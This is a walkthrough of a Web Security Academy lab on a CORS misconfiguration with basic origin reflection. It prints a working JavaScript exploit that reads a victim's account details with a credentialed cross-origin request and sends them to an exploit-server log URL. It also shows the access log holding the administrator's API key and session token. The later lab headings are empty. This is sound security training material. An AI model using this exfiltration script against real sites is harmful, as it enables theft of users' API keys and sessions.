# Cross-origin resource sharing (CORS)

## Basics

### CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: `wiener:peter`

----

1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.

![CORS](../../_static/images/cors1.png)

2. Review the history in Burp: The key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.

![CORS](../../_static/images/cors2.png)

3. Send the request to Burp Repeater, and resubmit it with the added header:

```text
Origin: https://whatever.com
```

![CORS](../../_static/images/cors3.png)

The origin is reflected in the `Access-Control-Allow-Origin` header, meaning the application allows an arbitrary (public) origin, and `Access-Control-Allow-Credentials` is also true.

4. Create exploit:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

5. Place exploit in `body` field of the form in the exploit server.
6. Click **View exploit** and check you land on the log page and your API key is in the URL. 
7. **Deliver exploit to victim**.
8. Go to **Access log**

```text
...
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /exploit/ HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22PY3qD4pkDMg4WDq1CZvntWDlPE0TFUyV%22,%20%20%22sessions%22:%20[%20%20%20%20%22pEGInv0rQCAB3vDmrgkuharW591raOlV%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
10.0.3.246      2023-01-02 21:51:33 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
```

9. Copy the administrator's API key, and enter it as solution to the lab.

### CORS vulnerability with trusted null origin

## Practitioner

### CORS vulnerability with trusted insecure protocols

## Expert

### CORS vulnerability with internal network pivot attack
